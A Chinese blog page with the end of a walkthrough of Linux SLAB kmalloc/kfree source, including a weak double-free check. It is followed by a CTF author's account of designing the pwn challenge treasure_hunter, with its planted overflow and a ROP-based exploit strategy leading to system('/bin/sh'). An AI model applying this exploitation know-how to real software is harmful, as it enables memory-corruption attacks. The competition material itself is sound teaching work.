<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">cache_alloc_refill</span><span class="params">(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> batchcount;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>, *<span class="title">shared</span>;</span></span><br><span class="line">	<span class="type">int</span> node;</span><br><span class="line">	<span class="type">void</span> *<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line">	node = numa_mem_id();</span><br><span class="line"></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">	batchcount = ac-&gt;batchcount;</span><br><span class="line">	<span class="keyword">if</span> (!ac-&gt;touched &amp;&amp; batchcount &gt; BATCHREFILL_LIMIT) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If there was little recent activity on this cache, then</span></span><br><span class="line"><span class="comment">		 * perform only a partial refill.  Otherwise we could generate</span></span><br><span class="line"><span class="comment">		 * refill bouncing.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		batchcount = BATCHREFILL_LIMIT;</span><br><span class="line">	&#125;</span><br><span class="line">	n = get_node(cachep, node);</span><br><span class="line"></span><br><span class="line">	BUG_ON(ac-&gt;avail &gt; <span class="number">0</span> || !n);</span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line">	<span class="keyword">if</span> (!n-&gt;free_objects &amp;&amp; (!shared || !shared-&gt;avail))</span><br><span class="line">		<span class="keyword">goto</span> direct_grow;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock(&amp;n-&gt;list_lock);</span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* See if we can refill from the shared array */</span></span><br><span class="line">	<span class="keyword">if</span> (shared &amp;&amp; transfer_objects(ac, shared, batchcount)) &#123;</span><br><span class="line">		shared-&gt;touched = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">goto</span> alloc_done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (batchcount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Get slab alloc is to come from. */</span></span><br><span class="line">		slab = get_first_slab(n, <span class="literal">false</span>);</span><br><span class="line">		<span class="keyword">if</span> (!slab)</span><br><span class="line">			<span class="keyword">goto</span> must_grow;</span><br><span class="line"></span><br><span class="line">		check_spinlock_acquired(cachep);</span><br><span class="line"></span><br><span class="line">		batchcount = alloc_block(cachep, ac, slab, batchcount);</span><br><span class="line">		fixup_slab_list(cachep, n, slab, &amp;<span class="built_in">list</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">must_grow:</span><br><span class="line">	n-&gt;free_objects -= ac-&gt;avail;</span><br><span class="line">alloc_done:</span><br><span class="line">	raw_spin_unlock(&amp;n-&gt;list_lock);</span><br><span class="line">	fixup_objfreelist_debug(cachep, &amp;<span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">direct_grow:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ac-&gt;avail)) &#123;</span><br><span class="line">		<span class="comment">/* Check if we can use obj in pfmemalloc slab */</span></span><br><span class="line">		<span class="keyword">if</span> (sk_memalloc_socks()) &#123;</span><br><span class="line">			<span class="type">void</span> *obj = cache_alloc_pfmemalloc(cachep, n, flags);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (obj)</span><br><span class="line">				<span class="keyword">return</span> obj;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		slab = cache_grow_begin(cachep, gfp_exact_node(flags), node);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * cache_grow_begin() can reenable interrupts,</span></span><br><span class="line"><span class="comment">		 * then ac could change.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ac = cpu_cache_get(cachep);</span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail &amp;&amp; slab)</span><br><span class="line">			alloc_block(cachep, ac, slab, batchcount);</span><br><span class="line">		cache_grow_end(cachep, slab);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的<code>if (!n-&gt;free_objects &amp;&amp; (!shared || !shared-&gt;avail))</code>这条语句，这里的目的是检查所有CPU共享的空闲链表中是否有可分配的对象，以及检查该节点中是否有空闲对象（<code>free_objects</code>指的是一个<code>kmem_cache_node</code>中的空闲对象数量），如果都没有则需要调用伙伴系统分配空间。</p>
<p>随后调用<code>transfer_objects</code>尝试从共享空间中将<code>batchcount</code>个空闲对象批量移动到CPU专属空闲链表中。后面直接从这里进行分配。而如果共享空间中没有可用对象，则会调用<code>get_first_slab</code>获取空闲slab，调用<code>alloc_block</code>将空闲slab上的空闲对象转移到CPU专属空闲链表中进行后续分配。</p>
<p>从上面的分析可以看到，无论是CPU专属空闲对象链表，还是NUMA节点全CPU共享空闲对象链表，它们只是起到了一个临时保存空闲对象的作用，并不会影响内核决定使用哪一个slab。</p>
<hr />
<p>以上就是对kmalloc的主要流程分析，下面是kfree的分析。</p>
<hr />
<h1 id="kfree"><a class="markdownIt-Anchor" href="#kfree"></a> kfree</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *object)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">	trace_kfree(_RET_IP_, object);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	folio = virt_to_folio(object);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;</span><br><span class="line">		free_large_kmalloc(folio, (<span class="type">void</span> *)object);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	slab = folio_slab(folio);</span><br><span class="line">	s = slab-&gt;slab_cache;</span><br><span class="line">	__kmem_cache_free(s, (<span class="type">void</span> *)object, _RET_IP_);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kfree);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __kmem_cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">		       <span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	__do_kmem_cache_free(cachep, objp, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline</span><br><span class="line"><span class="type">void</span> __do_kmem_cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">	local_irq_save(flags);</span><br><span class="line">	debug_check_no_locks_freed(objp, cachep-&gt;object_size);</span><br><span class="line">	<span class="keyword">if</span> (!(cachep-&gt;flags &amp; SLAB_DEBUG_OBJECTS))</span><br><span class="line">		debug_check_no_obj_freed(objp, cachep-&gt;object_size);</span><br><span class="line">	__cache_free(cachep, objp, caller);</span><br><span class="line">	local_irq_restore(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> __cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">					 <span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> init;</span><br><span class="line"></span><br><span class="line">	memcg_slab_free_hook(cachep, virt_to_slab(objp), &amp;objp, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (is_kfence_address(objp)) &#123;</span><br><span class="line">		kmemleak_free_recursive(objp, cachep-&gt;flags);</span><br><span class="line">		__kfence_free(objp);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * As memory initialization might be integrated into KASAN,</span></span><br><span class="line"><span class="comment">	 * kasan_slab_free and initialization memset must be</span></span><br><span class="line"><span class="comment">	 * kept together to avoid discrepancies in behavior.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	init = slab_want_init_on_free(cachep);</span><br><span class="line">	<span class="keyword">if</span> (init &amp;&amp; !kasan_has_integrated_init())</span><br><span class="line">		<span class="built_in">memset</span>(objp, <span class="number">0</span>, cachep-&gt;object_size);</span><br><span class="line">	<span class="comment">/* KASAN might put objp into memory quarantine, delaying its reuse. */</span></span><br><span class="line">	<span class="keyword">if</span> (kasan_slab_free(cachep, objp, init))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Use KCSAN to help debug racy use-after-free. */</span></span><br><span class="line">	<span class="keyword">if</span> (!(cachep-&gt;flags &amp; SLAB_TYPESAFE_BY_RCU))</span><br><span class="line">		__kcsan_check_access(objp, cachep-&gt;object_size,</span><br><span class="line">				     KCSAN_ACCESS_WRITE | KCSAN_ACCESS_ASSERT);</span><br><span class="line"></span><br><span class="line">	___cache_free(cachep, objp, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> ___cache_free(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span> =</span> cpu_cache_get(cachep);</span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line">	kmemleak_free_recursive(objp, cachep-&gt;flags);</span><br><span class="line">	objp = cache_free_debugcheck(cachep, objp, caller);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Skip calling cache_free_alien() when the platform is not numa.</span></span><br><span class="line"><span class="comment">	 * This will avoid cache misses that happen while accessing slabp (which</span></span><br><span class="line"><span class="comment">	 * is per page memory  reference) to get nodeid. Instead use a global</span></span><br><span class="line"><span class="comment">	 * variable to skip the call, which is mostly likely to be present in</span></span><br><span class="line"><span class="comment">	 * the cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (nr_online_nodes &gt; <span class="number">1</span> &amp;&amp; cache_free_alien(cachep, objp))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ac-&gt;avail &lt; ac-&gt;limit) &#123;</span><br><span class="line">		STATS_INC_FREEHIT(cachep);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		STATS_INC_FREEMISS(cachep);</span><br><span class="line">		cache_flusharray(cachep, ac);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks()) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span> =</span> virt_to_slab(objp);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (unlikely(slab_test_pfmemalloc(slab))) &#123;</span><br><span class="line">			cache_free_pfmemalloc(cachep, slab, objp);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__free_one(ac, objp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>kfree</code>中首先要找到要被释放的对象所属的<code>kmem_cache</code>。在<code>__cache_free</code>中有一些有关kasan的钩子函数等，用于对释放的对象进行隔离等操作，这里忽略。</p>
<p>直接跟踪来到<code>___cache_free</code>。这里有关键的判断：<code>ac-&gt;avail &lt; ac-&gt;limit</code>，如果条件为真，则表示CPU专属空闲对象链表还有可以存放对象的空间，就可以直接调用<code>__free_one</code>。如果为假，则需要首先调用<code>cache_flusharray</code>对数组进行清理。</p>
<h1 id="__free_one"><a class="markdownIt-Anchor" href="#__free_one"></a> __free_one</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &amp;alien-&gt;lock must be held by alien callers. */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> __free_one(<span class="keyword">struct</span> array_cache *ac, <span class="type">void</span> *objp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Avoid trivial double-free. */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_SLAB_FREELIST_HARDENED) &amp;&amp;</span><br><span class="line">	    WARN_ON_ONCE(ac-&gt;avail &gt; <span class="number">0</span> &amp;&amp; ac-&gt;entry[ac-&gt;avail - <span class="number">1</span>] == objp))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	ac-&gt;entry[ac-&gt;avail++] = objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的逻辑就很简单了，更新avail，添加对象即可。在此之前有对于double free的检查。但这里的double free检查不严格，仅仅检查了上一个free到这个数组的对象是否也是这个对象。如果这个对象第一次free后又有其他对象被free到了这里，那么这里的double free检查会报假阳性。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/" class="post-title-link" itemprop="url">L3HCTF命题记事</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-04 23:35:03" itemprop="dateCreated datePublished" datetime="2024-02-04T23:35:03+08:00">2024-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-02-06 10:31:03" itemprop="dateModified" datetime="2024-02-06T10:31:03+08:00">2024-02-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E6%83%B3/" itemprop="url" rel="index"><span itemprop="name">随想</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在我写这篇博客的时候，L3HCTF还有不足10个小时结束。这也是我第一次为一场正规的，全国及以上范围的CTF比赛命题。</p>
<p>当队长将pwn方向的命题管理权交给我时，我实际上是心虚的。要说pwn，我也学了两年多了，我真的是一名有水平、有实力的pwn选手吗，还是一个只能靠那些队内研究生元老大杀四方来蹭到决赛机会的CTF寄生虫呢。从目前来看，我似乎更像后者一些。每逢比赛，只有看到一些熟悉的，自己仔细分析过的赛题类型才敢去做，才敢尝试，且不一定能够尝试成功；而对于那些较为陌生的东西，则是避之不及，连查资料的时间也不愿意去花。</p>
<p>而当我命题结束时，我想清楚了一件事。一成不变，不愿接触新事物的选手，无论如何都无法取得真正的成就。你永远都不可能记得所有Linux常用命令的所有用法，解题本身不是一个对已有知识的复制粘贴，而更多的是将已知与未知相结合，并通过赛题本身学到更多的东西。</p>
<p>扯远了，说回命题。</p>
<p>本次L3HCTF的4道pwn题中，我命题的只有1道——treasure_hunter。它的灵感来源于我前段时间的Rust逆向学习上。我本来的打算，是通过对Rust二进制程序进行分析，同时提升自己对Rust语言以及Rust程序逆向的理解。这是一门优雅的语言，值得我细细品味。</p>
<p>在我接触到Rust的Hashmap时，我真正地尝到了一丝逆向的苦头。一开始，我并不知道Rust基于Swisstable实现Hashmap，只是想着通过纯逆向搞清楚其中的逻辑。但经过了长时间的尝试后，我发现这很难。于是我抱着碰一碰运气的心态，随便找了一些Rust源码中Hashmap底层的函数名放到网上查，居然一查就出现了想要的结果，我的理解进程大幅加快。</p>
<p>但在查资料的过程中，我也发现，网络中对于这个新型高效的Hashmap数据结构并没有太多的分析，有较为完整的介绍博客，但数量很少。因此，我萌生了以Swisstable为主题命题的想法，让更多选手了解这个数据结构以及相关的算法。</p>
<p>最初，我计划出的是Rust pwn，以Rust语言现成的Swisstable模板出题，这样更加方便。但出题过程中我发现，Rust语言是一个天生不适合出pwn题的语言，一些C/CPP中习以为常的内存操作却必须使用Unsafe包裹，很是不优雅，因此仅尝试了一小段时间后我就放弃了Rust pwn这个想法，转而想使用CPP手搓一个简易的Swisstable。这样埋设漏洞更加方便。当然，这样也就意味着我的工作量大大提高。好在，在牺牲了一些低耦合与灵活性的情况下，我还是成功完成了数据结构的构建。</p>
<p>在题目框架完成之后，下一步就需要考虑赛题应该使用什么漏洞利用方式了。由于数据结构本身比较复杂，如果需要使用一些利用条件较为苛刻的利用方式，无疑对解题者来说是一个身体和心理上的双重折磨，此类问题也是我最为深恶痛绝的，因此我决定将漏洞点设置地简单一些，但又让选手绕不开Swisstable这个数据结构本身，这样的话，解题体验应该会好很多吧。（另外做过题的选手应该都知道，我在最终给出的ELF文件中没有去除符号表，这实际上一方面暗示了本题的考点，另一方面省去了一些令人抓狂的逆向环节。事实证明，即使如此解出的队伍数量也不超过20，符合最终的难度预期）（笑）</p>
<p>在经历了两届招新赛和本次L3HCTF后，我发现我实际上是有自己的出题风格的。我喜欢将题目本身置于一个真实的场景之中，让选手解题时能够身临其境（笑）。本题也是如此，创建了一个挖宝的场景，并通过该场景中可能出现的经典元素作为本题的关键内容。本题的漏洞点实际上很简单，第一个是一个10字节的溢出，我还特意在堆的最低地址处塞了一个0x400的chunk，这样选手可以通过这个溢出修改Swisstable内部的指针，对内部的数据结构进行伪造，从而达到攻击效果。另外如果选手攒够了足够的金币，可以以一个较低的价格“买到”修改control bytes的机会以及Hashmap的地址。这也是第二个漏洞点，选手可以通过这个漏洞点，与第一个漏洞点配合完成若干次任意地址的读写。最终我的exp中就是通过任意地址读写直接修改栈上的返回地址，构造一个短的ROP链完成控制流劫持。</p>
<p>所以总的来说，本题如果除去Swisstable不看，实际上一个很简单的赛题，没有用到对glibc堆的任何house。因此本题非常考验选手对Swisstable数据结构的理解，否则将无法通过其完成读写操作。这也是我认为我出题出的不好的一点，没有完全贯彻“将已知和未知相结合”的理念。</p>
<p>行了不废话了，下面贴出本题的源码。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/hashmap.h">hashmap.h</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/hashmap.cpp">hashmap.cpp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/main.cpp">main.cpp</a></p>
<p>下面是本题的出题人版本exp以及Dockerfile等一些配置文件。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/exp.py">exp.py</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/Dockerfile">Dockerfile</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/service.sh">service.sh</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/start_docker.sh">start_docker.sh</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Hornos3/Hornos3.github.io/tree/master/2024/02/04/L3HCTF%E5%91%BD%E9%A2%98%E8%AE%B0%E4%BA%8B/pwn.xinetd">pwn.xinetd</a></p>
<p>我的思路是，首先把所有能挖的金币全挖出来，然后买到hashmap地址。由于本题的堆环境比较固定，可以通过这个hashmap地址获取到其他chunk的地址，通过固定偏移实现。随后我们通过将最开始的0x400的chunk分配出来（后面就是hashmap的chunk），通过10字节溢出将存放数据的指针进行修改，修改到我们伪造的地址中去，在exp中，伪造的数组在0x400中进行构造。由于hashmap没有检查边界，所以伪造后可以实现最多0x1C字节任意地址读。本题的挖矿区域是由mmap分配的，调试时可以看到这块空间位于ld.so的正下方，因此考虑可以在ld.so中寻找合适的偏移来泄露栈地址、libc地址等关键地址。这一步在正式比赛过程中成为了出题人的噩梦，因为我发现远程环境的偏移不一样，虽然说也可以通过爆破的方式通过多次连接完成多个字节的读写，但是这样会大大破坏做题的体验，因此比赛时不得不在队内服务器又部署了一份正常的然后端口映射到平台的端口，这也是为什么treasure_hunter在第一天不太稳定。（在此磕头谢罪砰砰砰）</p>
<p>在获取到关键地址之后，我们再一次分配那个最开始的0x400地址，准备开始写ROP chain。不过由于一开始我们并不知道返回值那个地方保存了什么值，所以需要首先读取然后通过加减金币完成写操作。出题人脚本里面是写入了一个pop rdi, ret ; addrof /bin/sh ; system这样一个简单的ROP chain，由于本题hashmap的大小为0x20，在不扩展的情况下最多可以读写0x1C个字节（0x1C这个数字怎么来的呢，这个就是Rust Swisstable的一个实现，Swisstable在填满7/8空间时就会进行扩展），足够完成这样一个ROP chain的编写。（审wp补档：看到了好几队都是通过写_IO_list_all来打fsop的，这种攻击方式我认为是更加出色的）</p>
<p>以上就是本题的做题流程。说实话我感觉这题出的还是不太好，有种强迫选手学Swisstable的感觉。但好在这也是迈出了第一步。后面的话还是要多接触一些好题，多学一些东西，向L3H大手子之路继续迈进。也非常感谢各位选手的包容以及评价。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
